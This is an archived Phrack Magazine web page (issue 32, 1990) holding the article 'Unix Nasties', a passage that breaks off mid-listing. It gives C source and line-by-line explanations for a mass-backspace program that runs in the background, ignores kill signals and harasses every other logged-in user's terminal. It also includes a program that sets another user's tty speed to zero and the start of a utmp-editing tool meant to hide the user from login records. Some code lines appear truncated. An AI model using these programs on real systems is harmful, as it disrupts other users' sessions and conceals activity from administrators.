@@ -1,0 +1,995 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Unix 'Nasties' ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a class="current" href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack32.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack32.tar.gz" title="Get current issue tar.gz">32</a> | <strong>Release date</strong> : <b>1990-11-17</b> | <strong>Editor</strong> : <b>Crimson Death</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/32/1.html#article">Phrack Classic XXXII Index</a></td><td align="right">Crimson Death</td></tr>
+<tr><td align="left"><a href="../../issues/32/2.html#article">Phrack Classic Spotlight featuring Knight Lightning</a></td><td align="right">Crimson Death &amp; Knight Lightning</td></tr>
+<tr><td align="left"><a href="../../issues/32/3.html#article">Concerning Hackers Who Break Into Computer Systems</a></td><td align="right">Dorthy Denning</td></tr>
+<tr><td align="left"><a href="../../issues/32/4.html#article">The Art of Investigation</a></td><td align="right">The Butler</td></tr>
+<tr><td align="left"><a href="../../issues/32/5.html#article">Unix 'Nasties'</a></td><td align="right">Sir Hackalot</td></tr>
+<tr><td align="left"><a href="../../issues/32/6.html#article">Automatic Teller Machine Cards</a></td><td align="right">Jester Sluggo</td></tr>
+<tr><td align="left"><a href="../../issues/32/7.html#article">A Trip to the NCSC</a></td><td align="right">Knight Lightning</td></tr>
+<tr><td align="left"><a href="../../issues/32/8.html#article">Inside the SYSUAF.DAT File</a></td><td align="right">Pain Hertz</td></tr>
+<tr><td align="left"><a href="../../issues/32/9.html#article">RSTS</a></td><td align="right">Crimson Death</td></tr>
+<tr><td align="left"><a href="../../issues/32/10.html#article">Knight Line I Part 1</a></td><td align="right">Doc Holiday</td></tr>
+<tr><td align="left"><a href="../../issues/32/11.html#article">Knight Line I Part 2</a></td><td align="right">Doc Holiday</td></tr>
+<tr><td align="left"><a href="../../issues/32/12.html#article">Knight Line I Part 3</a></td><td align="right">Doc Holiday</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Unix 'Nasties'</div>
+<div class="opt-bottom"> <strong>Author</strong> : Sir Hackalot</div>
+<pre>                              ==Phrack Classic==
+
+                     Volume Three, Issue 32, File #5 of 12
+
+
+        *%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*
+        %P                                                           P%
+        %H                  C UNIX `nasties' PART I                  H%
+        %A                            by                             A%
+        %Z             Sir Hackalot of PHAZE (10/20/90)              Z%
+        %E                                                           E%
+        *%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*
+
+
+o Purpose of this file:
+
+        The purpose of this file is to share small C programs for the Unix
+        System V and/or BSD 4.3 operating systems which as in logical terms,
+        &quot;Nasty&quot;.  This &quot;Nasty&quot; can be termed better as Annoyance programs
+        or tricky programs.
+
+        The purpose of this text however, is NOT to teach one how to program
+        in C and or how to use the C compiler on Unix systems.  This textfile
+        assumes you have a working knowledge of programming with C in the
+        UNIX environment.
+
+
+
+o The UTMP Reader:
+  ~~~~~~~~~~~~~~~~
+
+        First, I would like to start this text off by posting in a generic
+        /etc/utmp reader.  The /etc/utmp reader is essential for applications
+        that deal with all the users online at a given time.
+
+        Here is the source:
+
+- - - - - - - - - - - - - - - - - -CUT-HERE- - - - - - - - - - - - - - - - - -
+
+
+/* WhatTTY -- Generic WHO
+UTMP Reader &quot;Skeleton&quot; : By Sir Hackalot / PhaZe
+
+This is basically a skeleton program that is just a base for any UTMP
+operations.
+
+This is the skeleton that PhaZe(soft) uses for anything that deals
+with reading the utmp file, such as MBS, SEND, VW, MME, and other
+utilities.
+
+Applications: You can use this when you need to do something to
+everyone online, or when you need some sort of data from utmp, wtmp
+or any file that is like utmp.
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt; /* This is the key to the whole thing */
+#include &lt;utmp.h&gt;
+#include &lt;fcntl.h&gt;
+
+
+main()
+{
+        int handle;
+        char *etc = &quot;/etc/utmp&quot;;
+        struct utmp user;
+
+        handle = open(etc,O_RDONLY);
+
+        while(read(handle,&amp;user,sizeof(user)) != 0) {
+                if (user.ut_type == USER_PROCESS)
+                printf(&quot;%s is on %s\n&quot;,user.ut_name,user.ut_line);
+        }
+        close(handle);
+
+/* Simple, Right? */
+/* To see anything that is waiting for a login, change USER_PROCESS
+to LOGIN_PROCESS */
+}
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+        In the above program, this is what happens:
+        1.  I assigned the variable &quot;etc&quot; to point at the string
+                &quot;/etc/utmp&quot;, which is the utmp file.
+        2.  I opened in in Read ONLY mode (O_RDONLY).
+        3.  I started a loop that does not end until 0 bytes are
+            read into the user structure.  The 0 bytes would mean
+            end of file.
+
+        Notice the line:
+        if (user.ut_type == USER_PROCESS)
+
+        What the above line does is to distinguish between a user
+        and a terminal waiting for a Login.  The ut_type is defined
+        in utmp.h.  There are many types.  One of them is LOGIN_PROCESS.
+        That will be a terminal waiting for a login.  If you wanted to see
+        all the TTYs waiting to be logged in on, you would change the
+        USER_PROCESS to LOGIN_PROCESS.  Other types are things like
+        INIT_PROCESS.  You can just look in utmp.h to see them.
+
+        Also notice that I have inclide &quot;sys/types.h&quot;.  If you do not include
+        this file, there will be an error in utmp.h, and other headers.
+        types.h has definitions for other TYPES of data, etc.  So, if in
+        a header file you encounter a syntax error, you might need to include
+        sys/types.h
+
+        This program is just a skeleton, although it does print out who
+        is logged on, and to what TTY they are on.  You will see how this
+        skeleton I wrote can be used.  I used it to write MBS.
+
+_______________________________________________________________________________
+
+
+o MBS -- Mass BackSpace virus:
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+        MBS may not be considered a virus, since it does not replicate
+        itself.  However, it does &quot;infect&quot; every user that logs in, provided
+        the conditions are right.
+
+        The MBS virus uses the utmp reader to constantly read the utmp
+        file to find its next victim. Thus, eventually getting everyone, then
+        recycling to start again. Therefore catching people who login after
+        it is started.
+
+        Lets look at the source:
+
+- - - - - - - - - - - - - - - - - -CUT-HERE- - - - - - - - - - - - - - - - - -
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;utmp.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;signal.h&gt;
+/*
+   MBS - Mass BackSpace Virus!! v2.2 Deluxe+
+   (c) 1990 - Sir Hackalot
+   PhaZeSOFT Ltd.
+
+*/
+
+char *ent[10][100]; /* This supports 10 immune people change 10 to x for more */
+int maxitem = 5; /* Should be total # of immune dudes */
+int truefalse = 0;
+int warn[10],bad;
+char full_tty[15], text[160],  kstr[80];
+FILE *to_tty, *strm;
+struct utmp u;
+
+
+void kmes(fmt,boo)
+char *fmt;
+int boo;
+{
+        if (boo != 0) {
+                printf(&quot;MBS_KERN: &quot;);
+                printf(&quot;%s&quot;,fmt);
+        }
+        if (boo == 0) {
+                sprintf(full_tty,&quot;/dev/%s&quot;,u.ut_line);
+                to_tty = fopen(full_tty,&quot;w&quot;);
+                fprintf(to_tty,&quot;MBS_KERN: %s&quot;,fmt);
+                fclose(to_tty);
+        }
+}
+
+void initit() {  /* Initialize our little &quot;kernel&quot; */
+        int xxx = 0;
+        strcpy(ent[0],&quot;technic&quot;);
+        strcpy(ent[1],&quot;merlin&quot;);
+        strcpy(ent[2],&quot;datawiz&quot;);
+        strcpy(ent[3],&quot;par&quot;);
+        strcpy(ent[4],&quot;Epsilon&quot;);
+        while (xxx &lt; 11) {
+                warn[xxx] = 0;
+                xxx++;
+        }
+        kmes(&quot;Kernel Started.\n&quot;,1);
+}
+
+void warnem(wcnt) /* Notify all the immune people ... */
+int wcnt;
+{
+        if (bad == 0) { /* keep from dumping core to disk */
+                if (warn[wcnt] &lt; 2) {
+                        sprintf(kstr,&quot;%s has started a backspace virus!\n&quot;,getlo
+                        kmes(kstr,0);
+                        warn[wcnt]++;
+                }
+        }
+}
+
+
+int checkent(uname) /* Check for immunity */
+char *uname;
+{
+        int cnt = 0;
+        truefalse = 0; /* assume NOT immune */
+        while (cnt &lt; maxitem) {
+                if (strcmp(uname,ent[cnt]) == 0) { /* if immune... */
+                        truefalse = 1;
+                        warn[cnt]++; /* increment warning variable */
+                        warnem(cnt); /* warn him if we have not */
+                }
+
+                cnt++;
+        }
+        return(truefalse); /* return immunity stat. 1=immune, 0 = not */
+}
+
+
+/* Purpose: Instead of just ignoring the signal via SIG_IGN, we want
+to intercept it, and notify use */
+void sig_hand(sig)
+int sig;
+{
+if(sig == 3) kmes(&quot;Ignoring Interrupt\n&quot;,1);
+if(sig == 15) kmes(&quot;Ignoring Termination Signal\n&quot;,1);
+if(sig == 4) kmes(&quot;Ignoring quit signal.\n&quot;,1);
+        }
+
+main(argc,argv)
+int argc;
+char *argv[];
+
+{
+        int prio,pid,isg,handle;
+        char buf[80];
+        char name[20],tty[20],time[20];
+        initit();
+        if (argc &lt; 2) prio = 20;
+        if (argc == 2) prio = atoi(argv[1]);
+        if ((pid = fork()) &gt; 0) {
+        printf(&quot;Welcome to MBS 2.2 Deluxe, By Sir Hackalot [PHAZE]\n&quot;);
+                printf(&quot;Another Fine PhaZeSOFT production\n&quot;);
+                printf(&quot;Thanks to The DataWizard for Testing this\n&quot;);
+                printf(&quot;Hello to The Conflict\n&quot;);
+                sprintf(kstr,&quot;Created Process %s (%d)\n\n&quot;,argv[0],pid);
+                kmes(kstr,1);
+                exit(0); /* KILL MOTHER PID, return to Shell &amp; go background */
+        }
+        nice(prio);
+        signal(SIGQUIT,sig_hand);
+        signal(SIGINT,sig_hand);
+        signal(SIGTERM,sig_hand);
+        /* That makes sure you HAVE to do a -9 or -10 to kill this thing.
+           Sometimes, hitting control-c will kill of background processes!
+           Add this line if you want it to continue after you hangup:
+           signal(SIGHUP,SIG_IGN);
+doing it will have the same effect as using NOHUP to
+to execute it. Get it? Nohup = no SIGHUP
+*/
+        while(1) {  /* &quot;Kernel&quot; Begins here and never ends */
+                handle = open(&quot;/etc/utmp&quot;,O_RDONLY);
+                while (read(handle,&amp;u,sizeof(u)) != 0) {
+                        bad = 0;
+                        sprintf(full_tty,&quot;/dev/%s&quot;,u.ut_line);
+                        if (strcmp(u.ut_name,getlogin()) != 0) {
+
+         /* Fix: Below is a line that optimizes the hosing/immune process
+            It skips the utmp entry if it is not a user.  If it is, it
+            checks for immunity, then comes back. This is alot faster
+            and does not wear down cpu time/power */
+
+               if (u.ut_type == USER_PROCESS) isg = checkent(u.ut_name);
+               else isg = 1;
+                 if (isg != 1) {
+                                        if((to_tty = fopen(full_tty,&quot;w&quot;)) == NUL
+                                                bad = 1;
+                                        }
+                                        if (bad == 0) {
+                                                fprintf (to_tty, &quot;\b\b\b&quot;);
+                                                fflush (to_tty);
+                                        }
+                                        fclose(to_tty);
+                                }
+                        }
+                }
+                close (handle);
+        }
+}
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+        I am going to try to take this bit by bit and explain how it works
+        so that maybe you can come up with some good ideas on creating
+        something similar.
+
+        I will start with the MAIN function.  Here it is:
+
+___
+
+main(argc,argv)
+int argc;
+char *argv[];
+
+{
+        int prio,pid,isg,handle;
+        char buf[80];
+        char name[20],tty[20],time[20];
+        initit();
+___
+
+        Obviously, this is the part of the code which initializes the main
+        variables used.  The &quot;main(argc,argv)&quot; is there so it can accept
+        command line parameters.  The command line parameters are just
+        for speed customization, which I will discuss later.  Notice how
+        the variables are defined for the command line parameters:
+
+        int argc, char *argv[];
+
+        argc is the number of arguments, INCLUDING the name of the current
+        executable running.  argv[] holds the strings in an array which make
+        up the parameters passed.  argv[0] holds the name of the program,
+        while argv[1] holds the 1st parameter entered on the command line.
+        initit() is called to set up the necessary tables.  All of
+        the variables defined at the top of the program are global, and alot
+        of these functions use the global variables, as does initit();.
+
+___
+
+if (argc &lt; 2) prio = 20;
+if (argc == 2) prio = atoi(argv[1]);
+___
+
+        Ok, the above two lines essentially parse the command line.
+        The MBS program only accepts ONE argument, which is the priority
+        value to add to the normal process priority.  This is so you
+        can customize how fast MBS runs.  If you want to burn CPU time,
+        you would invoke mbs by:
+        $ mbs 0
+
+        That would make the priority as fast as the current can run something.
+        MBS's default priority setting is 20, so that CPU time will be saved.
+        MBS is very fast however, and since alot of Unix systems like to
+        cache alot of frequently used data from disks, it gets fast after
+        it reads utmp a few times, since utmp will be cached until it changes.
+        However, you can run MBS with a number from 0-19, the higher the
+        number, the &quot;less&quot; priority it will have with the cpu.
+
+
+___
+
+if ((pid = fork()) &gt; 0) {
+  printf(&quot;Welcome to MBS 2.2 Deluxe, By Sir Hackalot [PHAZE]\n&quot;);
+  printf(&quot;Another Fine PhaZeSOFT production\n&quot;);
+  sprintf(kstr,&quot;Created Process %s (%d)\n\n&quot;,argv[0],pid);
+  kmes(kstr,1);
+  exit(0); /* KILL MOTHER PID, return to Shell &amp; go background */
+}
+
+___
+
+        The above is what sends MBS into the background.  It calls fork(),
+        which creates another process off the old one.  However, fork()
+        can be considered &quot;cloning&quot; a process, since it will use anything
+        beneath it.  So, now you can assume there are TWO copies of MBS
+        running -- One in the foreground, and one in the background.  However,
+        you may notice the exit(0).  That first exit kills off the parent.
+        a second call to exit() would kill the child as well.  notice the
+        call to &quot;kmes&quot;.  kmes is just a function that is defined earlier,
+        which I will discuss later.
+___
+
+nice(prio);
+signal(SIGQUIT,sig_hand);
+signal(SIGINT,sig_hand);
+signal(SIGTERM,sig_hand);
+/*   signal(SIGHUP,SIG_IGN); */
+___
+
+        The above code is integral for the survival of the MBS program in
+        memory.  The nice(prio) is what sets the new priority determined
+        by the command line parsing.
+
+        The signal() statements are basically what keeps MBS running.  What
+        it does is catch INTERRUPTS, Quits, and a regular call to KILL.
+        the commented out portion would ignore requests to kill upon hangup.
+        This would keep MBS in the background after you logged off.
+
+        Why do this?  Well, remember that the parent was affected by
+        its environment?  Well, the new forked process is too.  That means,
+        if you were 'cat'ting a file, and hit control-C to stop it, the
+        cat process would stop, but push the signal on to MBS, which would
+        cause MBS to exit, if it did not have a signal handler.  The signal
+        calls setup signal handlers.  What they do is tell the program
+        to goto the function sig_hand() when one of the 3 signals is
+        encountered.  The commented signal just tells the program to ignore
+        the hangup signal.  The sig_hand argument can be replaced with
+        SIG_IGN if you just want to plain ignore the signal and not handle it.
+
+        The SIGQUIT is sometimes the control-D character.  That is why it
+        also must be dealt with.  If the signals aren't ignored or caught,
+        MBS can easily kicked out of memory by YOU, by accident of course.
+
+___
+
+while(1) {  /* &quot;Kernel&quot; Begins here and never ends */
+     handle = open(&quot;/etc/utmp&quot;,O_RDONLY);
+___
+
+        The above starts the main loop.  The begining of the loop is to open
+        the utmp file.
+
+___
+
+ while (read(handle,&amp;u,sizeof(u)) != 0) {
+      bad = 0;
+      sprintf(full_tty,&quot;/dev/%s&quot;,u.ut_line);
+      if (strcmp(u.ut_name,getlogin()) != 0) {
+        if (u.ut_type == USER_PROCESS) isg = checkent(u.ut_name);
+           else isg = 1;
+        if (isg != 1) {
+           if((to_tty = fopen(full_tty,&quot;w&quot;)) == NULL)  {
+              bad = 1;
+              }
+           if (bad == 0) {
+              fprintf (to_tty, &quot;\b\b\b&quot;);
+              fflush (to_tty);
+              }
+              fclose(to_tty);
+        }
+    }
+___
+
+
+        Above is the sub_main loop.  what it does is go through the utmp
+        file, and on each entry, it prepares a path name to the TTY
+        of the current utmp entry (sprintf(fulltty...)).  Then it checks
+        to see if it is YOU.  If it is, the loop ends.  If it is not, then
+        it sees if it is a User.   If not, it ends the loop and goes to
+        the next.
+
+        If it is a user, it goes to checkent to see if that user has been
+        declared immune in the immunity tables (down below later..).
+        If the idiot is not immune, it attempts to open their tty.  If it
+        cannot, it sets the bad flag, then ends the loop.  If it can be
+        written to, it sends three backspaces, according to YOUR tty specs.
+        Then, it closes the opened tty, and the loop continues until the end.
+
+___
+
+       }
+close (handle);
+    }
+}
+
+___
+
+        The above is the end of the main loop.  It closes handle (utmp) so
+        it can be reopened at the start of the loop at the beginning of the
+        file.  The reason to not create a table of people to hit in memory
+        after one reading is so that MBS will stop after people logoff, and
+        to start when new ones logon.  The constant reading of the utmp
+        file makes sure everyone gets hit, except immune people.  Also,
+        the file must be closed before reopening, or else, after a few opens,
+        things will go to hell.
+
+
+Here is the signal handler:
+
+___
+
+void sig_hand(sig)
+int sig;
+{
+if(sig == 3) kmes(&quot;Ignoring Interrupt\n&quot;,1);
+if(sig == 15) kmes(&quot;Ignoring Termination Signal\n&quot;,1);
+if(sig == 4) kmes(&quot;Ignoring quit signal.\n&quot;,1);
+        }
+___
+
+        It is very simple.  when a signal is caught and sent to the handler,
+        the library function SIGNAL sends the signal number as an argument
+        to the function.  The ones handled here are 3,4, and 15.  But
+        this was just for effect.  You could just have it print one line
+        no matter what the signal was, or just rip this function out and
+        put in SIG_IGN in the signal calls.
+
+        Below is the immunity check:
+___
+
+int checkent(uname) /* Check for immunity */
+char *uname;
+{
+        int cnt = 0;
+        truefalse = 0; /* assume NOT immune */
+        while (cnt &lt; maxitem) {
+                if (strcmp(uname,ent[cnt]) == 0) { /* if immune... */
+                        truefalse = 1;
+                        warn[cnt]++; /* increment warning variable */
+                        warnem(cnt); /* warn him if we have not */
+                }
+
+                cnt++;
+        }
+        return(truefalse); /* return immunity stat. 1=immune, 0 = not */
+}
+
+___
+
+        Above, you see variables used that are not defined.  They are
+        just variables that were declared as globals at the begining.
+        What this does is just compare the login name sent to it with
+        every name in the immunity table.  If it finds the name on
+        the table matches, it will go and see if it should warn the
+        user.  Also, the warn count is incremented so that the warning
+        function will know if the user has been warned.
+
+        Here is the warning function:
+
+___
+
+void warnem(wcnt) /* Notify all the immune people ... */
+int wcnt;
+{
+        if (bad == 0) { /* keep from dumping core to disk */
+                if (warn[wcnt] &lt; 2) {
+                        sprintf(kstr,&quot;%s has started a backspace virus!\n&quot;,getlo
+                        kmes(kstr,0);
+                        warn[wcnt]++;
+                }
+        }
+}
+___
+
+        What this does is take the position number of the table entry and
+        checks and see if that entry has been warned before.  It decides
+        this by checking its value.  If it is less than two, that means
+        the user had not been warned.  After it is sent, the function
+        incrememnts the warning flag so that they will never been warned
+        again until the program has stopped &amp; restarted or someone else
+        runs one.  The &quot;if (bad == 0)&quot; is there so that it only warns a
+        person if it can write to the tty.
+
+        Here is the kmes function you keep seeing:
+
+___
+
+void kmes(fmt,boo)
+char *fmt;
+int boo;
+{
+        if (boo != 0) {
+                printf(&quot;MBS_KERN: &quot;);
+                printf(&quot;%s&quot;,fmt);
+        }
+        if (boo == 0) {
+                sprintf(full_tty,&quot;/dev/%s&quot;,u.ut_line);
+                to_tty = fopen(full_tty,&quot;w&quot;);
+                fprintf(to_tty,&quot;MBS_KERN: %s&quot;,fmt);
+                fclose(to_tty);
+        }
+}
+___
+        All this is, is a fancy printf which prints a string with
+        &quot;MBS_KERN:&quot; stuck on the front of it.  the BOO variable is just
+        so it can determine whether or not to send it to the local
+        screen or to another tty.  It is just for looks.
+
+        Now, finally, we can look at the initializer:
+
+___
+
+void initit() {  /* Initialize our little &quot;kernel&quot; */
+        int xxx = 0;
+        strcpy(ent[0],&quot;sirh&quot;);
+        strcpy(ent[1],&quot;merlin&quot;);
+        strcpy(ent[2],&quot;datawiz&quot;);
+        strcpy(ent[3],&quot;par&quot;);
+        strcpy(ent[4],&quot;epsilon&quot;);
+        while (xxx &lt; 11) {
+                warn[xxx] = 0;
+                xxx++;
+        }
+        kmes(&quot;Kernel Started.\n&quot;,1);
+}
+___
+
+        This is a very SIMPLE procedure.  It just fills the list
+        with the people to keep immune.  ent[..][..] is what holds
+        the immune list.  It also zeros out the warning flags associated
+        with each user.  (&quot;sirh&quot;,&quot;merlin&quot;,&quot;par&quot;,etc. are acct. names)
+
+        This &quot;virus&quot; can do more than just send backspaces if you want it
+        to, but it will take modification.  Some people have modified
+        it to include the next program, which is ioctl.c.
+
+_______________________________________________________________________________
+
+
+
+o IOCTL -- Set another's tty w/out read perms
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+        The program ioctl is very very nice.  What it does is basically
+        act like stty, but you don't have to use the &lt; to change
+        someone else's terminal.  Here is the listing:
+
+- - - - - - - - - - - - - - - - - -CUT-HERE- - - - - - - - - - - - - - - - - -
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sgtty.h&gt;
+#define TIOC ('T'&lt;&lt;8)
+#define TCSETA (TIOC|2)
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+        int x;
+        struct sgttyb histty;
+        if (argc == 1) exit(0);
+        x = open(argv[1],O_WRONLY);
+        if (x == -1) exit(0);
+        histty.sg_ispeed = B0;
+        histty.sg_ospeed = B0;
+        ioctl(x,TCSETA,&amp;histty);
+}
+
+- - - - - - - - - - - - - - - - - -CUT-HERE- - - - - - - - - - - - - - - - - -
+
+        The basis of the program is that you give a full path to the tty
+        to nail.  You need to be able to write to the tty for it to work.
+
+        Notice the two defines.  They are in there so you do not have
+        to include termio.h, and hence get 200 warnings of redefinition.
+        This program is WAY simpler than MBS, but here is how it works:
+
+___
+
+main(argc,argv)
+int argc;
+char *argv[];
+___
+
+        Of course, the above sets up the program to get command line
+        arguments.
+
+___
+
+        int x;
+        struct sgttyb histty;
+___
+
+        These are the variables.  the sgttyb structure is what the ioctl
+        function call needs to do its duty.  You can do a lot to a tty
+        using the structure, but this program only does 2 things to the
+        tty, as you shall soon see.  Remember that the programs here can
+        be modified, especially this one.  Just check out sgtty.h to
+        see the modes you can pop a tty into.
+
+___
+
+        if (argc == 1) exit(0);
+        x = open(argv[1],O_WRONLY);
+        if (x == -1) exit(0);
+___
+
+        The above three lines are the open/error checks.  The 1st line
+        says that if the idiot did not give an argument then exit
+        the program.  The argument needs to be the path to the
+        device driver (/dev/tty...).
+        The second line opens the tty for writing, and the third exits
+        upon error.
+
+___
+
+        histty.sg_ispeed = B0;
+        histty.sg_ospeed = B0;
+        ioctl(x,TCSETA,&amp;histty);
+___
+
+        The above three lines are the meat of the program.  What they
+        do is this:
+
+        Line 1 sets the input speed to 0 for the tty into the structure.
+        line 2 sets the output speed to 0 for the tty into the structure.
+        line 3 sets the tty according to the structure histty.
+
+        That is why if you look into the components of the structure, you can
+        do things, such as convert all output to uppercase for them,
+        set a higher baud, redefine CR mapping, redefine tabs, and
+        all sorts of things.
+
+_______________________________________________________________________________
+
+
+o MME - Make ME!:
+  ~~~~~~~~~~~~~~~
+        MME is just a program which changes utmp for you, in order to hide
+        you, or just mess with other user's minds.  This is a different
+        version then the one I originally put out.  In this version,
+        I removed the code that lets you change your tty.  It just became
+        too dangerous to change your tty.
+
+        Here is the listing:
+
+- - - - - - - - - - - - - - - - - -CUT-HERE- - - - - - - - - - - - - - - - - -
+
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;utmp.h&gt;
+#include &lt;sys/stat.h&gt;
+
+char *mytty; /* For an exact match of ut_line */
+char *backup_utmp = &quot;cp /etc/utmp /tmp/utmp.bak&quot;;
+struct utmp *user;
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+        int good= 0,cnt = 0,start = 1, index = 0;
+        char err[80];
+        system(backup_utmp);
+    printf(&quot;Welcome to MME 1.00 By Sir Hackalot\n&quot;);
+    printf(&quot;Another PHAZESOFT Production\n&quot;);
+    printf(&quot;Status:&quot;);
+    if (argc == 2) printf(&quot;Changing your login to %s\n&quot;,argv[1]);
+        if (argc == 1) printf(&quot;Removing you from utmp\n&quot;);
+
+        utmpname(&quot;/etc/utmp&quot;);
+        mytty = strrchr(ttyname(0),'/'); /* Goto the last &quot;/&quot; */
